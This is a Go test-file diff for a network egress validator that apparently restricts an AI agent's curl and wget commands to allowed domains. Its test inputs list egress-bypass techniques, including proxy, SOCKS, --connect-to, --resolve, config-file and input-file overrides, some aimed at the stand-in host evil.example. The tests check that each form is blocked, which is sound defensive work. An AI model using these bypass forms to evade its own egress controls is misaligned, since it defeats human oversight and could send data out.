@@ -32,9 +32,6 @@ func TestNetworkEgressExtractsNonURLDomainForms(t *testing.T) {
 	if err := s.validateNetworkEgress([]string{"curl", "api.github.com"}, ""); err != nil {
 		t.Fatalf("expected bare domain to be allowed: %v", err)
 	}
-	if err := s.validateNetworkEgress([]string{"curl", "--host", "api.github.com"}, ""); err != nil {
-		t.Fatalf("expected --host form to be allowed: %v", err)
-	}
 	if err := s.validateNetworkEgress([]string{"curl", "--url", "https://api.github.com/repos"}, ""); err != nil {
 		t.Fatalf("expected --url form to be allowed: %v", err)
 	}
@@ -56,6 +53,20 @@ func TestNetworkEgressBlocksHostPathBypass(t *testing.T) {
 	}
 	if err := s.validateNetworkEgress([]string{"wget", "evil.com/file"}, ""); err == nil {
 		t.Fatalf("expected alternate client host/path form to be blocked")
+	}
+}
+
+func TestNetworkEgressRejectsUnsupportedCurlHostFlag(t *testing.T) {
+	s := &server{networkEgressPolicy: config.NetworkEgressPolicy{
+		Enabled:      true,
+		AllowDomains: []string{"api.github.com"},
+	}}
+	err := s.validateNetworkEgress([]string{"curl", "--host", "api.github.com"}, "")
+	if err == nil {
+		t.Fatalf("expected unsupported --host form to be rejected")
+	}
+	if !strings.Contains(err.Error(), "inspectable destination") {
+		t.Fatalf("expected inspectable-destination deny detail, got %v", err)
 	}
 }
 
@@ -102,5 +113,82 @@ func TestNetworkEgressRejectsDirectNetworkClientWithoutInspectableDestination(t 
 	}
 	if got := err.Error(); got == "" || !strings.Contains(got, "inspectable destination") {
 		t.Fatalf("expected inspectable-destination deny detail, got %v", err)
+	}
+}
+
+func TestNetworkEgressRejectsDecoyDomainFlags(t *testing.T) {
+	s := &server{networkEgressPolicy: config.NetworkEgressPolicy{
+		Enabled:            true,
+		RequireIntentMatch: true,
+		IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
+	}}
+
+	for _, cmd := range [][]string{
+		{"curl", "--config", "./agent.cfg", "-u", "api.github.com:token"},
+		{"curl", "--config", "./agent.cfg", "--proxy", "api.github.com:443"},
+		{"wget", "--config", "./agent.cfg", "--output-document", "api.github.com"},
+	} {
+		err := s.validateNetworkEgress(cmd, "run_tests")
+		if err == nil {
+			t.Fatalf("expected decoy destination form %q to be rejected", strings.Join(cmd, " "))
+		}
+		if got := err.Error(); got == "" || !strings.Contains(got, "inspectable destination") {
+			t.Fatalf("expected inspectable-destination deny detail for %q, got %v", strings.Join(cmd, " "), err)
+		}
+	}
+}
+
+func TestNetworkEgressIgnoresDecoyDomainLikeValuesOnNonDestinationArgs(t *testing.T) {
+	s := &server{networkEgressPolicy: config.NetworkEgressPolicy{
+		Enabled:            true,
+		RequireIntentMatch: true,
+		IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
+	}}
+
+	for _, cmd := range [][]string{
+		{"curl", "--config", "./agent-controlled.cfg", "-u", "api.github.com:token"},
+		{"curl", "--config", "./agent-controlled.cfg", "--proxy", "api.github.com:443"},
+		{"wget", "--config", "./agent-controlled.cfg", "--output-document", "api.github.com"},
+	} {
+		err := s.validateNetworkEgress(cmd, "run_tests")
+		if err == nil {
+			t.Fatalf("expected decoy destination args to be rejected for %q", strings.Join(cmd, " "))
+		}
+		if !strings.Contains(err.Error(), "inspectable destination") {
+			t.Fatalf("expected inspectable-destination deny for %q, got %v", strings.Join(cmd, " "), err)
+		}
+	}
+}
+
+func TestNetworkEgressRejectsOpaqueOrDestinationOverrideArgsEvenWithInspectableURL(t *testing.T) {
+	s := &server{networkEgressPolicy: config.NetworkEgressPolicy{
+		Enabled:            true,
+		RequireIntentMatch: true,
+		IntentAllowDomains: map[string][]string{"run_tests": {"api.github.com"}},
+	}}
+
+	for _, cmd := range [][]string{
+		{"curl", "https://api.github.com/repos", "--config", "./agent-controlled.cfg"},
+		{"curl", "https://api.github.com/repos", "--proxy", "http://evil.example:8080"},
+		{"curl", "https://api.github.com/repos", "--proxy1.0", "http://evil.example:8080"},
+		{"curl", "https://api.github.com/repos", "--preproxy", "http://evil.example:8080"},
+		{"curl", "https://api.github.com/repos", "--connect-to", "api.github.com:443:evil.example:443"},
+		{"curl", "https://api.github.com/repos", "--resolve", "api.github.com:443:10.0.0.1"},
+		{"curl", "https://api.github.com/repos", "--socks4", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--socks4a", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--socks5", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--socks5-hostname", "evil.example:1080"},
+		{"curl", "https://api.github.com/repos", "--future-route-override", "evil.example"},
+		{"wget", "https://api.github.com/repos", "--config", "./agent-controlled.cfg"},
+		{"wget", "https://api.github.com/repos", "--input-file", "./urls.txt"},
+		{"wget", "https://api.github.com/repos", "--execute", "use_proxy=on"},
+	} {
+		err := s.validateNetworkEgress(cmd, "run_tests")
+		if err == nil {
+			t.Fatalf("expected opaque/destination-override args to be rejected for %q", strings.Join(cmd, " "))
+		}
+		if !strings.Contains(err.Error(), "opaque or destination-override") {
+			t.Fatalf("expected opaque/destination-override deny for %q, got %v", strings.Join(cmd, " "), err)
+		}
 	}
 }
